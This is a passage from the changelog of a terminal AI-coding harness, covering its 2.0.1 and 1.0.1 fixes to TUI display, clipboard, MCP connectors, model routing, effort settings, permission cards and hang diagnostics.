     `first_token` (kind: reasoning/text/tool), `waiting_for_model` -- the
     data-side contract a later TUI liveness pass renders a live phase
     line from; print/stream-json output is unchanged (no new stdout
     noise).
8. **Visible thinking, live counters, rotating tips** (W2b, the TUI side
   of the GLM round; see "Is it frozen?" in
   [TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md)):
   - A live phase line per model call, ticked by the drain timer at least
     once a second: `Sending request to <model>…`, `Thinking… (12 s, no
     tokens yet)`, `Thinking… (18 s · 412 reasoning tokens)`, `Writing…`,
     `Waiting for model…` between tool results and the next call, then
     `Thought for 18 s` as the summary; after 30 s without data the line
     says so and names Esc and steering.
   - The thinking preview shows the last three lines of streamed
     reasoning in every wire shape, collapses to the summary on
     completion and stays open under Ctrl+O; reasoning that arrives only
     with the final chunk shows the summary at that moment.
   - Status bar: spinner, phase word, elapsed seconds and a received-token
     counter that climbs as chunks arrive; idle only on turn done (a
     mid-turn tool step no longer blanks it). Running tool cards show
     elapsed seconds; a nested sub-agent card shows the child's phase and
     tool count live.
   - Rotating tips replace the static prompt placeholder: 52 curated tips
     plus one generated per slash command, a new tip at launch, after
     every turn and every 15 s while idle, never while typing; `/tips`
     lists them; `tips: false` in config.json or `HALO_TIPS=0` restores a
     plain placeholder; a test checks every command, flag and key a tip
     names.
   - The `/effort` card marks a clamped choice inline (`medium (sent as
     high on this route)`) and the status chip shows the sent value.
9. **Prompt history recall, copy and paste in the chat box** (W2c):
   - Up recalls the prompt just typed in halo again: Claude Code's
     history stores millisecond timestamps and halo stored seconds, so
     the merged sort put every Claude Code entry after every halo entry.
     Both units are normalised at read time and halo now writes
     milliseconds; Up on an empty first line recalls the newest entry, a
     typed prefix walks only matching entries, Down past the newest
     restores the draft; a steer or slash command typed over a pending
     card also reaches history.
   - Ctrl+C copies a selection made inside the chat box (OSC 52 plus the
     external-tool fallback) instead of arming quit; Ctrl+X cuts it;
     Ctrl+A selects all; Ctrl+V pastes from the system clipboard through
     xclip, xsel or wl-paste, pbpaste, or PowerShell Get-Clipboard when
     one exists, otherwise it names the terminal's own paste shortcut.
     Bracketed paste is unchanged. The keys are listed in the F1 help and
     in TROUBLESHOOTING.md "Copy and paste".
   - Status bar: the phase word follows the phase line within one drain
     tick (a reasoning model's thinking-to-writing transition fired no
     second phase event); when the bar overflows it drops the MCP count,
     then the balance, then shortens the cwd to its last component
     instead of slicing a path mid-word.
10. **Deprecation notice**: the legacy env file `~/.config/vibes-hacker/env`
    (still read as a fallback behind the new `~/.config/halo/env`, see the
    2.0.0 entry above) stops being read starting in 2.0.4 (the hardening
    release) -- move any credential that still lives only in the old file
    into the new one (`halo init`, or hand-edit) before upgrading past 2.0.3.
11. **MCP "explain the zero"**: `/mcp`, `halo mcp list` and `doctor` now
    name every scope they actually searched -- user scope, this
    directory's project-local scope, this directory's own `.mcp.json`,
    plugins, managed -- with the count found in each, and name another
    directory's `.mcp.json` the user's own history remembers (never a
    bare "0 servers" with no indication where it looked). A server that
    fails to connect now says why instead of a bare "Failed to connect":
    command not found on PATH, connection refused on `host:port`, or a
    disabled transport's own reason.
12. **claude.ai connectors reachable from any model**: when `claude` is
    installed and logged into claude.ai, each account-side connector
    becomes a `connector__<slug>` tool any model can call
    (`{request, tool, args}`) -- it runs a headless `claude -p` scoped to
    just that connector's own tools and returns the result through the
    usual MCP caps, so a connector is no longer usable only from inside a
    real `claude` session. Discovery runs in the background from `claude
    mcp list` and the stream-json init line, cached under `~/.halo/mcp/
    connectors.json`; `/mcp` shows each connector's status and the
    re-auth step; config `connectors.bridge` and a per-connector
    `enabled`/`alwaysLoad`; a settings rule written for the Claude Code
    tool name applies to the bridge tool too.
    - **Cold start**: with an empty cache, `claude` on PATH and a claude.ai
      login, `halo mcp list` discovers synchronously (a 20s cap) and shows
      the connectors without `--refresh`; a print-mode run does the same
      before its tool catalog freezes only when a connector is actually
      wanted (`--tools` naming one, a ToolSearch that asks for one, or
      `connectors.discover_on_start: true`), so a plain `-p` call is never
      held up by a login probe it did not need.
    - **Landing live in a running TUI**: when the cache was cold at
      startup, the background kick used to run before any claude.ai auth
      status was even cached, so eligibility refused it and a cold-cache
      TUI never learned its connectors at all for the whole session (no
      note, 0/0 connectors). The startup worker that primes the auth
      cache now re-kicks the same once-per-process discovery the moment
      its own refresh says claude.ai login, and the connector tools join
      the catalog with one transcript note saying how many arrived,
      typically within 8s of a cold start. The auth-cache priming `halo
      mcp list`/`halo providers` do is skipped once the cache is already
      fresh, so repeated CLI calls stop re-running the `claude` probe
      every time.
13. **`halo mcp serve`, importing from Claude Desktop, and a real OAuth
    login**: no `mcp` subcommand is a stub any more. `halo mcp serve` runs
    Halo's own built-in tools as a stdio MCP server (driven by a real MCP
    client in the tests); `add-from-claude-desktop` imports Claude
    Desktop's own server config; `reset-project-choices` clears a
    project's remembered `.mcp.json` approvals. `halo mcp login`/`logout`
    run a generic OAuth 2.0 authorization-code flow with PKCE, endpoint
    discovery and a local callback, naming no vendor, with tokens under
    `~/.halo/mcp/oauth/`; the tokens are now actually used -- http/sse
    servers send `Authorization: Bearer <access_token>`, a 401 refreshes
    the token once, and otherwise says to run `halo mcp login <name>`
    (tested against a local fake authorization server, never a real one).
14. **14 more hook events, and the flag list finished**: Setup,
    UserPromptExpansion, MessageDisplay, TaskCreated/TaskCompleted
    (sub-agents), StopFailure, InstructionsLoaded, ConfigChange,
    CwdChanged, DirectoryAdded, FileChanged, WorktreeCreated,
    PreModelSwitch and PostModelSwitch now fire from their natural
    trigger points with documented payloads; only WorktreeRemoved
    (nothing removed a worktree yet -- fixed two parts later, see below)
    and the two MCP elicitation events (no elicitation protocol in this
    build) stayed accepted-and-ignored, and the README/handbook/
    architecture doc say exactly that. No CLI flag is left "not yet": 21
    are real (`--restricted`, `--brief`, `--environment`, `--autocompact`,
    `--include-hook-events`, `--permission-prompt-tool`,
    `--permission-prompts`, `--plugin-dir`/`--plugin-url`, `--betas`,
    `--tmux`, `--worktree`, `--ax-screen-reader`, `--bg`,
    `--no-session-persistence`, `--prompt-suggestions`,
    `--fallback-model`, `--forward-subagent-text`,
    `--exclude-dynamic-system-prompt-sections`, `--system-prompt-
    snapshot`) and 7 cloud/IDE flags are declared not applicable with a
    one-line reason each (`--cloud`, `--teleport`, `--remote-control` and
    its prefix, `--from-pr`, `--ide`, `--safe-mode`, accepted with no
    effect); `docs/COMMANDS.md` documents each one.
15. **Skills inside sub-agents, their asks reach the dock, `/rewind`
    covers files a step touched**: a skill with `context: fork` or
    `agent` runs in a general-purpose sub-agent instead of reporting "not
    implemented"; AskUserQuestion and permission asks from a child --
    including a background one -- reach the parent's own pending dock
    tagged with the agent's name and are answered there. `/rewind`/
    `/undo`/`/redo` now cover more than the logged conversation: a step's
    own new files are deleted on undo and recreated on redo, NotebookEdit
    changes are shadow-copied, and a Bash command's new files in a git
    repo are captured through a status diff; a Bash shadow also captures
    TRACKED files a command modified, not just new ones, so rewinding
    past an edit a command itself made restores them too (a file already
    dirty before the command ran is a documented limit either way).
16. **Clipboard quality, and Ctrl+C says what it does**: copying from the
    transcript or a tool card now copies the widget's own SOURCE text,
    never the screen cells -- trailing spaces gone, soft wraps intact,
    the transcript's own glyphs/borders removed, a multi-widget selection
    joined in document order, a code block kept exactly as written, `\n`
    line endings everywhere (`clipboard.crlf` for CRLF). New copy actions
    need no mouse: `/copy` (last reply), `/copy code`/`/copy code N`
    (fenced blocks), `/copy tool` (last tool output), `y` on a focused
    tool card or in the pager (its full content), `Y` (the whole current
    turn); every copy ends with a toast naming what was copied and how
    many characters. OSC 52 is trusted only where the terminal actually
    relays it (Windows Terminal yes, a plain conhost window no); a real
    `clip.exe` fallback (UTF-16 input) exists on Windows and `pbcopy` on
    macOS, and `doctor` names the mechanism actually in use. Ctrl+C's
    toast reads "Press Ctrl+C again to exit halo (your terminal stays
    open)"; config `quit_on_double_ctrl_c: false` turns the double-press
    exit off entirely, so only `/exit`, Ctrl+D or Ctrl+Q leave, and the F1
    help, TROUBLESHOOTING.md and the input placeholder's own rotating tip
    all say so.
17. **Fallback models, background-job hooks, plugin skills/hooks/MCP,
    worktree removal, and more flags wired for real**: `--fallback-model`
    is wired into the retry ladder -- when a retryable provider failure
    exhausts its retries, the session swaps to the next fallback model
    for the rest of the turn with one notice naming both. Background
    Bash jobs now fire TaskCreated/TaskCompleted with the job id,
    command, status and exit code, the way sub-agents already did.
    `--plugin-dir`/`--plugin-url` load a plugin's skills, hooks and MCP
    servers as well as its agents, following Claude Code's own plugin
    layout; plugin skills are namespaced `<plugin>:<skill>` and reachable
    by the Skill tool, not only from the slash menu. `halo worktree rm
    <path>` and config `worktree.remove_on_exit` fire WorktreeRemoved --
    removal itself had never worked at all before this: it ran `git` from
    a directory that was not a working tree, and on Windows from inside
    the very directory being deleted. `--betas` sends the
    `anthropic-beta` header only on Anthropic-family routes (it had been
    leaking to OpenRouter and Databricks chat requests); `--prompt-
    suggestions` also works in the stream-json multi-turn loop; `halo bg
    list|logs|stop|rm` manage a detached `--bg` run.
18. **Process-group kills can no longer hit the harness itself**: `halo bg
    stop`, the Bash tool's timeout kill and the `cc:` child's interrupt/
    kill now signal a child's own process group only when that group is
    not the harness's own, and a PID sharing our group is killed alone;
    killed children are reaped, so a zombie no longer counts as "still
    alive". Found because a new `halo bg stop` test spawned a plain child
    inside the suite runner's own process group and, on Linux, killed the
    runner, its wrapper shell and the whole SSH session every time the
    suite reached that test. The suite runner is now line-buffered too,
    so a run killed mid-way still leaves its true last line on disk
    instead of a stale module header stuck in a block buffer.
19. **A runbook for the checks that need a real terminal or login,
    steadier suites, and a privacy scan test**: `docs/harness/
    LIVE-CHECKS.md` lists exactly what to run and look for the checks a
    mock upstream can't stand in for (a real terminal, a real `claude`
    login, a real MCP server), gated behind `HALO_LIVE=1` in
    `tests/live/`. The `cc:` session, CLI-flag and chrome/playwright smoke
    tests now poll with a bounded deadline instead of a fixed sleep, so a
    loaded machine makes them slower, never red; the flaky first-run
    `cc:` session case on Linux is covered by three standalone repeats in
    the Kali run. Fixture homes, example paths and sample MCP server
    names across tests and docs are synthetic now, never a real machine/
    project/hobby-gear name; `tests/test_privacy_scan.py` fails the suite
    outright if one of those comes back, or a real LAN address, home path
    or key-shaped string does (`tests/privacy_scan_allowlist.txt` holds
    the deliberate test fakes) -- it walks the tree directly rather than
    erroring out on a copy with no `.git` (the Kali suite runs from a tar
    copy).
20. **Two rounds of release review, before the tag**: a full read of the
    whole 2.0.1 diff against every part's own commit message. Round A
    found 2 critical and 16 major defects -- among them a
    `--no-session-persistence` run with `-c`/`--resume` that deleted the
    very conversation it resumed, the TUI silently ignoring
    `--restricted`/`--fallback-model`/`--plugin-dir`/`--betas`/`--brief`/
    `-w`, a cross-provider `--fallback-model` that sent the fallback's
    request with the PRIMARY provider's key, and `isolation: worktree`
    sub-agents whose edits landed outside their own permission scope --
    each fixed with its own pinning test, alongside the
    `--restricted`/`--betas`/`--brief` parity gaps above. Round B found 20
    more minors and the remaining 7 parity gaps: a background sub-agent's
    own dock card that never finalized once it actually finished; a
    steer-restart that silently inflated the next real retry's backoff; a
    `git worktree remove --force` fallback that discarded a session's own
    uncommitted edits on exit; `@server:uri`/`git@host:path` false
    positives in the unresolved-mention warning (and that warning finally
    reaching the user, not just the model, as documented); Windows
    Ctrl+V/`clip.exe` mangling non-ASCII paste/copy text; a connector call
    missing `--no-session-persistence` and running in the wrong cwd; an
    `--autocompact` flag a settings.json `env` block could silently
    outrank; and several telemetry, doctor and timeline-text fixes.
    Docstrings that quoted the owner by name or a private project
    directory were reworded, and the privacy scan above now also checks,
    case-insensitively, for the owner's hobby-gear tool names and the
    owner's own name.

## [1.0.1] - 2026-09-30

A hotfix release from the owner's first real 1.0.0 run on the Kali work VM
(DNS down, then fixed), a live `/model` screenshot from it, and several
days of live use on a work VM after that. Nineteen fixes, all with pinning
tests:

1. **Completion popup keys**: with the `/`/`@` completion popup open,
   Up/Down move the highlight, Tab/Enter accept it, Esc closes it, typing
   still filters -- the prompt's own TextArea no longer swallows Up/Down
   (history nav) while the popup is open.
2. **Fail fast on DNS/connection failures**: a hung/unresolvable host used
   to take upwards of 60s to fail (the OS resolver's own retry policy,
   completely unbounded); every connect (DNS included, not just the TCP
   handshake) is now capped at 8s, and a DNS/refused/unreachable failure
   never rides the 1-2-4-8-16s retry ladder (one immediate retry, then
   terminal) -- across `-p`, the TUI, `init`'s pong, `models --refresh`,
   `/models refresh`, and `doctor`. The error names the host: "cannot
   resolve/reach `<host>` -- check the machine's network, DNS or VPN".
3. **`/models` shows the cache instantly**: bare `/models` (TUI or
   headless) and `rolo-claude models` (CLI) never touch the network any
   more -- a bug in the TUI's own do-refresh check made even a BARE
   `/models` refresh over the network. Only `/models refresh`/`/dbx`/
   `--refresh` do; a failed refresh still shows the (unchanged) cached
   table plus one line naming the error.
4. **Cache carries the gateway types**: every cached row now shows a real
   `path` (family default, from `dbx_routing`) and `chat-capable` counts
   the endpoint's own `task == "llm/v1/chat"` (never a name-based guess or
   `bool(api_types)`, which used to disagree with the table on the same
   rows). An old cache from before this milestone (no `api_types` at all)
   is detected and migrated on next background refresh, else shown as
   "path unknown (refresh needed)" rather than a silently wrong guess.
5. **Interactive model picker in `init`**: a filterable arrow-key list of
   chat-capable endpoints grouped by family (a numbered list with no real
   terminal) offered right after the catalog is refreshed; `--yes`/
   `--model` skip it. The TUI's own `/model` picker got the same grouping.
6. **Bare endpoint names**: `--model databricks-kimi-k3`/`/model
   databricks-kimi-k3`/`init --model databricks-kimi-k3` resolve exactly
   like `dbx:databricks-kimi-k3` whenever the name matches a cached
   endpoint (even a workspace-custom name with no `databricks-`/
   `system.ai.` shape) or that generic shape; an unresolvable name
   suggests the three closest cached endpoints instead of a bare error.
7. **List-dialog keyboard forwarding**: every filter-`Input` + `OptionList`
   dialog (`/model`, `/resume`, the command palette, `init`'s own picker)
   forwards Up/Down/PageUp/PageDown/Home/End to the list and Enter to the
   highlighted row, instead of the `Input` silently swallowing them (Down
   in `/model` used to do nothing at all).
8. **`/model` rows, single line**: grouped with one header per group
   instead of an inline `[group]` tag, each row ellipsized rather than
   wrapped (a long ref/path used to break the column alignment).
9. **`cc:` group gating**: shown only when `claude auth status` reports an
   actual claude.ai login -- a Databricks work box's own settings-driven
   `claude` login used to list nine `cc:` models that would refuse at
   request time.
10. **Unified `ctx`/`out`/price columns**: `/model`, `/models`,
    `rolo-claude models`, and `init`'s own picker now show the SAME
    context/output/USD-per-1M-token columns for every provider, Databricks
    included (previously `path=... dbu=?` only, with "?" everywhere) --
    normalized units (`200000` -> `200k`, `1048576`/`1050000` -> `1M`),
    blank (never `?`) for anything not published. Databricks pricing comes
    from models.dev when that endpoint is listed there, else
    `model_table.json`'s own context (prices blank), else blank.
    `fetch_models_dev` now sends a real `User-Agent` (models.dev's CDN can
    403 a header-less default urllib agent).
11. **`VERIFY_X509_STRICT` cleared on every TLS context**: Python 3.13
    turned this on by default; a corporate TLS-inspection proxy's
    re-signing CA can carry a technically-non-conformant certificate
    extension that only this stricter mode rejects (curl/browsers/Node/
    pre-3.13 Python all accept it) -- seen live as `models --refresh`
    failing with `CERTIFICATE_VERIFY_FAILED: ... basic constraints of CA
    cert not marked critical` on a work VPN while a Databricks pong (a
    different, inspection-exempt host) kept working. Fixed for every
    HTTPS call this harness makes; certificate-chain/hostname verification
    itself is unchanged.
12. **`init` is provider-first**: step 1 is now "select a provider to set
    up" (Databricks/OpenRouter/Anthropic API/Claude subscription) with a
    status tag per row, instead of a home/work/claude "preset" naming a
    bundle of choices ("work" WAS just Databricks, confusingly named).
    Each provider runs its own credentials -> catalog -> model-pick ->
    live-pong path, offers to set up another, and picks one overall
    default when more than one ends up configured. `--provider` (repeatable)
    drives it non-interactively; the old `--preset home|work|claude` still
    works, as a deprecated one-line-noticed alias.
13. **Status bar shows real context/cost for every model, Databricks
    included**: `ctx 12k/1M 1%` (or `ctx 12k` alone with no known limit)
    and a real `$0.0123` (or `in 12k out 3k` token totals with no known
    price) replace the permanent `ctx ?`/`$?` a Databricks model used to
    show. `CostMeter` no longer hard-codes Databricks cost as always
    unknown -- it computes a real fallback cost whenever a models.dev price
    was resolved for that endpoint, same formula every other provider
    already used. The model label truncates from the left on a narrow
    terminal so ctx/cost stay visible; cwd shrinks first.
14. **The transcript follows new output**: streamed text, thinking blocks,
    and expanding tool cards used to leave the view wherever the user's own
    prompt was after the first line -- `Transcript` now anchors to the
    bottom (Textual's own `anchor()`) while "following," releases on a
    manual scroll up (showing a "↓ N new" count in the status bar), and
    re-anchors on `Ctrl+End`, a click on that indicator, or a new prompt.
15. **A pending permission/plan/question card intercepts free text**:
    typing while one is pending used to always steer the turn underneath it
    silently -- it now answers the card directly (deny-with-feedback, keep-
    planning, or "Other", matching Claude Code's own behavior), and
    switching to `auto`/`bypassPermissions`/`dontAsk` (`Shift+Tab`) now
    resolves an already-pending permission card immediately instead of
    leaving it stuck. The status bar shows a "permission needed: ..." tag
    and the prompt placeholder changes while one is pending. This, combined
    with fix 14, was the real mechanism behind a reported TUI "freeze."
16. **`init` also asks for a default permission mode**: `auto` (recommended),
    `acceptEdits`, `default`, `plan` -- written to `~/.rolo-claude/
    config.json`'s own `permission_mode` key, now a layer in the starting-
    mode precedence chain between `--permission-mode` and settings.json's
    `permissions.defaultMode`. `doctor` prints the effective mode and its
    source.
17. **Worker-group isolation and a hard Ctrl+Q**: the git-branch and
    statusline timers (`exclusive=True`, no `group=`) were silently
    cancelling every other in-flight background worker (models refresh,
    catalog refresh, session list, `/improve` drafts, ...) every 5 seconds
    -- each now runs in its own named group, as does every `tui/slash.py`
    worker. `Ctrl+Q` force-quits within 2 seconds even if the session is
    wedged; a Key event with no focused widget now self-heals focus back to
    the prompt (or the active modal's own first focusable widget).
18. **Databricks Claude foundation endpoints reject `xhigh`**: a Databricks
    Claude route's `output_config.effort` only accepts `low`/`medium`/
    `high`/`max` -- a session with no more specific effort set now defaults
    every Anthropic-family route (`cc:`/`ant:`/Databricks Claude foundation)
    to `high` instead of leaving it unset, and `xhigh` is clamped to `max`
    on any route that doesn't list it (a `/model` switch re-clamps too). A
    live 400 naming the effort field retries once with it stripped before
    the turn is treated as failed.
19. **`/effort` actually changes the level**: it used to ignore its own
    argument and only ever echo a value snapshotted at session start
    (typing `/effort medium` kept showing whatever was configured before
    launch). `/effort <level>` now sets the session's effort immediately
    (clamped per fix 18), remembered for the rest of the session; bare
    `/effort` in the TUI opens an inline Claude-Code-style selector card
    (the route's own accepted levels in a row, Left/Right to move, Enter to
    apply, Esc to keep the old value) instead of only printing text. The
    status bar shows a short effort tag next to the mode.
20. **gpt-6 rejects `reasoning_effort` alongside tools**: every turn on
    `dbx:databricks-gpt-6-sol` 400'd ("Function tools with reasoning_effort
    are not supported for gpt-6-sol... set reasoning_effort to 'none'") --
    any endpoint whose name contains `gpt-6` now sends `reasoning_effort:
    "none"` explicitly whenever the request carries tools (a tool-less
    request, or `--effort`/`/effort` on any other family, is unaffected); a
    live 400 with this wording on a different OpenAI-family endpoint
    retries once with the same explicit override.
21. **Enter runs a completed `/` command** (Claude Code parity): with the
    completion popup open, one Enter both inserts the highlighted `/`
    command and runs it (`/mo` + Enter opens the model picker; `/models` +
    Enter runs it). A second Enter used to be required, which read as
    "/models does nothing". Tab still only inserts, and an `@` path
    completion is only ever inserted.
22. **`vendor/model` needs both halves**: `/effort`, `vendor/` and refs
    containing whitespace are refused locally with the usual no-route
    error instead of being accepted as an OpenRouter model and failing
    upstream with a 400 on the first request.

No behavior changes beyond the fixes above; `__version__` is the only
non-test/non-doc change outside the files each fix's own commit touched.

### Review fix pass (same day)

A follow-up review of the fixes above, before this hotfix shipped, found
18 further issues. The following were fixed, each with its own pinning
test; two low-risk minors (a second pending-card slot for concurrent
sub-agent asks, and the connect-timeout retry/leak detail) are deferred --
see "1.0.1 follow-ups" in `docs/harness/RECOMMENDATIONS.md`.

- **`/model` no longer freezes the TUI**: it opened on the UI thread,
  re-read and re-parsed the full `models-dev.json` cache once PER
  Databricks endpoint, and spawned `claude auth status` synchronously --
  2-5s measured on a real catalog. The picker now opens through a worker
  thread; the models.dev cache loads once per `/model` open, not once per
  row; the `claude auth status` check is a cached read, primed once by a
  startup worker, never spawned by `/model` itself.
- **Post-connect network failures ride the retry ladder again**: a
  dropped keep-alive or mid-response reset (after the TCP connection was
  already open) carried the same "cannot resolve/reach" marker a genuine
  DNS/connect failure uses, so it skipped the retry ladder entirely
  instead of riding it like the pre-hotfix 502 behavior. Only a real
  connect-phase failure carries that marker now.
- **Focus self-heal stays on the active screen**: a modal with nothing
  focusable of its own (the pager `o` opens) no longer heals focus to a
  pending card on the screen underneath it, which used to let the modal's
  own keys (`q`/`o`) vanish in favor of the hidden card's (`1`/`y` could
  silently approve a permission the user never saw).
- **`Shift+Tab` re-evaluates a pending permission card for real**:
  switching mode now re-runs the permission engine for the parked
  request instead of blindly allowing/denying it -- an explicit `ask:`
  rule still asks under `auto` (only `bypassPermissions` skips it),
  `acceptEdits` now resolves a pending in-workdir edit/write card, and a
  card the user is already answering (pressed `4`, typing why) is left
  alone instead of being silently finished out from under them.
- **`Ctrl+Q` has its own flag**: it no longer shares `_quitting` with
  double-`Ctrl+C`/`/quit`, so it still works when THAT path is the one
  that's hung; a daemon timer force-kills the process 2.5s after
  `self.exit()` regardless of what Textual/asyncio is still waiting on.
- **Databricks cost is billed once per token, and repriced on `/model`**:
  cached/reasoning tokens were counted at both the full rate and their own
  discounted rate; switching to a new Databricks endpoint mid-session now
  updates the cost meter's own rates instead of billing new usage at the
  old model's prices.
- **OpenRouter prices show again**: `models.json` stores them as numeric
  strings; every price reader now accepts that (`/model`, `rolo-claude
  models`, and `init`'s picker all went blank otherwise).
- **WebFetch and MCP http/sse use the shared TLS policy**: both were
  outside fix 11 above (a different code path -- urllib's own
  `build_opener`/httpx's own client, neither going through
  `open_upstream`).
- **`init` never overwrites an existing `permission_mode`/`model`**:
  `--yes` and Esc now keep whatever's already configured (writing nothing
  at all on a fresh box) instead of forcing `auto`/a fixed-order guess
  over what was actually there.
- **An effort-rejection 400 no longer wastes its one retry on the wrong
  fix**: the gpt-6 "none with tools" classifier (fix 20 above) matched too
  broadly -- any 400 naming both "reasoning_effort" and the bare word
  "param". The general strip-the-field retry can now run after a failed
  "none" retry instead of being blocked by a shared one-shot flag, and a
  successful strip resets the session's effort so later steps don't keep
  re-sending the rejected value first.
- **The Anthropic "high" default (fix 18 above) is scoped to
  adaptive-capable models**: a non-adaptive route (Haiku 4.5, Sonnet 4.5
  or older) no longer gets a thinking budget nearly as large as
  `max_tokens` by default (capped at half of it instead); the version
  parser reads hyphenated ids (`claude-sonnet-4-6`) correctly; the
  `tool_choice: any` repair retry drops thinking (Anthropic rejects that
  combination outright).
- **The gpt-6 "none with tools" rule (fix 20 above) is Databricks-only**,
  driven by explicit `model_table.json` rows for both real `models.dev`
  name shapes -- it no longer also fires for an OpenRouter model that
  happens to have "gpt-6" in its name.
- **Chat-dialect routes no longer accept `max`** (an Anthropic-only
  level) from `/effort`; the retry also recognizes OpenRouter's nested
  `reasoning.effort` 400 wording and a generic "Invalid value" one.
- **Commands typed while a card is pending run instead of denying the
  tool**: a `/`-prefixed submission always goes to slash handling first,
  whatever card is pending; pasted feedback carries the real content, not
  the `[Pasted text #n]` placeholder; the `/effort` card no longer
  intercepts typed text at all.
- **A tall card's auto-scroll is restored once answered**: focusing a
  card too large to fit releases the transcript's bottom anchor (fix 14
  above; Textual's own scroll-to-center on focus); `clear_pending_card`
  now re-anchors when the user was following before the card appeared.
- Wording: `init`'s "default" permission mode no longer implies a risk
  check this project doesn't have ("ask before edits and non-read-only
  tools", not "...or otherwise risky").
- **Rate-limit and stats token counts include reasoning again**: since
  `map_usage` reports reasoning tokens separately (so they are never
  billed twice), the Databricks output-tokens-per-minute tracker and
  `stats` `tokens_out` now add them back, or a reasoning-heavy reply
  under-counted and the 429s the tracker prevents came back.
- **MCP over HTTP prefers the pinned `httpx2`** and falls back to classic
  `httpx` only when `httpx2` is absent, so an environment carrying both
  never hands the MCP SDK the wrong client type.
- **Adaptive thinking is gated to Opus 4.6+**: Opus 4.1 and 4.5 (both
  served on Databricks) keep `budget_tokens`, as Sonnet below 4.6 already
  did; every `opus` id used to count as adaptive. Bedrock-style ids that
  put the version before the family (`us-anthropic-claude-3-7-sonnet-...`)
  now parse their real version instead of the snapshot date.

`__version__` is unchanged.

### Part 2 (same release): tabbed provider setup, hang diagnostics, provider enablement, effort polish

Finishes the 1.0.1 round -- item 13's tabbed provider view, item 15's
remaining hang diagnostics, the new item 21 provider-enablement model, and
item 22's remainder -- plus five minors the reviewer logged after the fix
pass above. All with pinning tests; `__version__` stays 1.0.1.

- **`init`'s provider setup is now tabbed** (item 13): one tab per provider
  -- Databricks, OpenRouter, Anthropic API (key), Claude Code subscription,
  and a new fifth tab, TypeSafe (stores `TYPESAFE_API_KEY` only, for a
  later feature -- no routed models yet) -- replacing the one-provider-at-
  a-time picker loop on a REAL terminal only (a piped/non-tty run, every
  existing script, keeps the exact old sequential-picker-plus-numbered-
  fallback path, byte for byte). Shift+Tab and Left/Right (the latter only
  while the tab bar itself has focus -- a focused credential field's own
  Left/Right still moves the cursor) switch tabs; Up/Down move between a
  tab's own fields/button; Enter activates a field or button; Esc leaves
  the dialog and `init` proceeds to the default-model/permission-mode
  steps exactly as before. Each tab opens showing what the harness already
  picked up ("picked up from `<source>`: `<masked>`", or a discovered
  Databricks host with just the token field left) with the status line
  updating live as a value is typed; a bounded background probe (the same
  8s connect-only cap item 2 introduced) shows "reachable" / "unreachable:
  `<reason>`" / "not set up"; finishing a tab with real credentials fetches
  and caches that provider's catalog right then, off the UI thread. A
  Textual runtime failure (no real terminal after all) falls back to the
  old sequential picker instead of crashing `init` outright.
- **Provider enablement** (item 21, new): a provider's models now reach
  `/model`/`rolo-claude models`/the `init` default pick/`doctor` only once
  it's EXPLICITLY enabled -- by completing its tab above, by `rolo-claude
  providers enable <name>`/`/providers enable <name>`, or (one-time only,
  for a box with credentials from before this existed) an automatic
  migration `doctor`/`init` run the first time. Detected credentials or a
  `claude.ai` login never enable a provider on their own -- a `cc:` group
  no longer appears in `/model` just because `claude auth status` reports
  a real login (item 9's own gate), and a hand-typed ref for a disabled
  provider is refused with a one-line message naming the fix; a detected-
  but-disabled provider shows one dim hint line in `/model` instead of a
  selectable row. `rolo-claude providers`/`/providers`: a table (enabled,
  credentials found and where, reachable, cached model count) plus
  `enable`/`disable`/`setup <name>`. Labels used everywhere (the tabs,
  `/model`'s group headers, `doctor`, `/providers`): `dbx:` Databricks,
  `or:` OpenRouter, `ant:` Anthropic API (key), `cc:` Claude Code
  subscription -- the full prefix table is in `docs/MODELS.md`.
- **Hang diagnostics** (item 15 remainder): a daemon watchdog thread
  (started from `on_mount`, completely independent of the UI's own event
  loop -- the point is that it keeps working when THAT is what's stuck)
  polls a heartbeat `_tick_spinner` bumps every second; once it's stalled
  past 15s it dumps every thread's stack (`sys._current_frames()`), the
  named background-worker list, and the active screen to
  `~/.rolo-claude/hang-<UTC>.log` (one line also to `bridge.log`), at most
  once a minute while it persists. `SIGUSR1` (POSIX) dumps the same
  diagnostics on demand. `--debug` now also traces, to `bridge.log`: every
  Key event (with the focused widget and active screen), window
  focus/blur, and the start/finish/cancel of every named background
  worker. An audit of `_drain` and every `call_from_thread` call site found
  no unbounded blocking of the UI thread (every `subprocess.run` already
  had a timeout and already ran on its own worker thread; no `Worker.
  wait()`/shared-lock call exists on this path) -- the watchdog above is
  the backstop for whatever that audit missed. (The 1Hz heartbeat timer
  itself is now wired through a lambda instead of the bound `_tick_spinner`
  method directly -- `set_interval` keeps calling whatever reference it was
  first given, so a test that needs to simulate a stalled heartbeat by
  replacing the instance's own `_tick_spinner` was silently still ticking
  the original every second; no production behaviour changes, only what a
  test can now actually stop.)
- **`/effort` and the status bar show `none (tools)`** on a route where the
  gpt-6 table rule or a LEARNED per-endpoint rule applies (item 22
  remainder): the EFFECTIVE value actually sent on a tool-carrying turn,
  not the configured one that route would ignore anyway, with the
  selector card's own description line (and `/effort`'s own source line)
  explaining why. The learned per-endpoint `reasoning_effort_with_tools`
  rule (a live 400 proving an untabled Databricks endpoint also needs it)
  now persists to `~/.rolo-claude/learned-rules.json`, not only in memory
  for the rest of one session -- a NEW session against the same endpoint
  sends it correctly from its very first request, never re-paying for the
  failing one. A `model_table.json` row always wins over a learned entry.
- **Five minors from the reviewer's post-fix-pass notes**, each with its
  own pinning test: `Ctrl+Q` now calls `session.job_registry.kill_all()`
  immediately, before its `os._exit` timer is even armed, instead of only
  deep inside the ordinary (possibly also-wedged) `controller.quit()`
  path it exists to route around; `clamp_effort` clamps an unsupported
  `max` to `xhigh` on a chat-dialect route that has `xhigh` but no `max`
  (the mirror of the existing `xhigh`-without-`max` case), instead of
  falling all the way to the bland `medium` default; `/effort`, `/rewind`
  and `/improve` show a one-line note instead of opening their own card
  while any card (a live permission ask, most importantly) is already
  pending; `init`'s per-provider default-model step no longer overwrites a
  custom model already configured when it merely differs from that
  provider's own hardcoded default (only the final cross-provider pick
  previously preserved a custom value) -- an explicit `--model` this run
  still wins outright; `cached_auth_status_is_stale`'s own TTL is now
  actually consulted (bare `/model`'s own stale-Databricks-catalog-refresh
  worker does the same for the claude-auth-status cache), so a `claude.ai`
  login/logout during a long session is reflected the next time `/model`
  opens, not only after restarting the whole app.
- **State-dir scoping** (found during this round's own fix pass): a test
  module that builds a real `Session`/`Controller` without scoping
  `BRIDGE_STATE_DIR` itself used to only avoid leaking into the REAL
  `~/.rolo-claude/sessions` because an EARLIER module happened to leave
